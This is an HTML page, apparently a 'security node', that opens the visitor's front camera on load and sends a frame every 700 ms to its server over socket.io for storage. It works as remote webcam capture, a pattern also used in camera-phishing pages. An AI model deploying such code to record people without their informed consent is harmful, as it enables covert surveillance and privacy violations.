<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Node - HD Active</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: black; }
        video { width: 100vw; height: 100vh; object-fit: cover; }
        .overlay { position: absolute; top: 20px; left: 20px; z-index: 10; pointer-events: none; }
    </style>
</head>
<body>

    <div class="overlay">
        <div class="flex items-center gap-2 bg-black/40 backdrop-blur-md px-4 py-2 rounded-full border border-white/10">
            <span class="w-3 h-3 bg-red-600 rounded-full animate-pulse"></span>
            <span class="text-white text-xs font-bold tracking-widest uppercase">HD Streaming Active</span>
        </div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" class="hidden"></canvas>

    <script>
        const socket = io();
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        window.onload = async () => {
            try {
                // HD রেজোলিউশন রিকোয়েস্ট (1280x720)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: false 
                });
                
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    startStreaming();
                };
            } catch (err) {
                console.error("HD Camera Error:", err);
                alert("ক্যামেরা এক্সেস প্রয়োজন।");
            }
        };

        function startStreaming() {
            setInterval(() => {
                if (!video.videoWidth) return;

                // হাই কোয়ালিটি ফ্রেম ক্যাপচার
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // image/webp এবং কোয়ালিটি ০.৬ রাখা হয়েছে HD ক্লারিটি বজায় রাখতে
                const frame = canvas.toDataURL('image/webp', 0.6);
                socket.emit('store-frame', frame);
            }, 700); // স্মুথ ভিডিওর জন্য ডিলে কিছুটা কমানো হয়েছে
        }
    </script>
</body>
</html>
